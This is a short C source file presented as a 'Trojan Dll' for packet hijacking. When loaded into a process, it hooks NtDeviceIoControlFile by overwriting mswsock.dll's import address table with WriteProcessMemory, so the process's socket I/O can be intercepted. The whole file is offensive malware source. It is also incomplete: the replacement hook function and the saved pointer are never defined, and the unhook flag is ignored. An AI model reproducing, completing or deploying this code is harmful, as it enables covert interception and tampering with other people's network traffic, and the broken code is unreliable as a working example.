//////////////////////////////////////////////////////////////////////////
// Trojan Dll,Packet Hijacking
// Author:	0xQo
//////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <winnt.h>

// Hook NtDeviceIoControlFile()
BOOL HookApi(BOOL bFlag);


int DllMain(__in void * _HDllHandle, __in unsigned _Reason, __in_opt void * _Reserved)
{
	if (_Reason == DLL_PROCESS_ATTACH)
	{
		HookApi(TRUE);
	}
	else if (_Reason == DLL_PROCESS_DETACH)
	{
		HookApi(FALSE);
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
// Hook NtDeviceIoControlFile()
//////////////////////////////////////////////////////////////////////////
BOOL HookApi(BOOL bFlag)
{
	HMODULE hModule = LoadLibrary("mswsock.dll");
	if (hModule == NULL)
	{
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}

	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((ULONG)hModule+pDosHdr->e_lfanew);
	if (pNtHdr->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	if (pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress==0 ||
		pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size==0)
	{
		return FALSE;
	}

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG)hModule+pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	PIMAGE_THUNK_DATA	ThunkData;
	while (pImportDescriptor->FirstThunk)
	{
		char* dllname = (PCHAR)((ULONG)hModule+pImportDescriptor->Name);
		if (stricmp(dllname,"ntdll.dll") != 0)
		{
			pImportDescriptor++;
			continue;
		}

		ThunkData = (PIMAGE_THUNK_DATA)((ULONG)hModule+pImportDescriptor->OriginalFirstThunk);
		int index = 1;
		while (ThunkData->u1.Function)
		{
			char* funame = (PCHAR)((ULONG)hModule+ThunkData->u1.AddressOfData+2);
			if (stricmp(funame,"NtDeviceIoControlFile") == 0)
			{
				ULONG myAdr = (ULONG)NewDeviceIoControlFile;
				ULONG dwRet;
				PDWORD lpAdr = (PDWORD)((ULONG)hModule+(DWORD)pImportDescriptor->FirstThunk)+index-1;
				NtDeviceIoControlFile = (PVOID)(*(ULONG*)lpAdr);
				WriteProcessMemory(GetCurrentProcess(),lpAdr,&myAdr,sizeof(ULONG),&dwRet);
				return TRUE;
			}
			index++;
			ThunkData++;
		}
		pImportDescriptor++;
	}

	return FALSE;
}
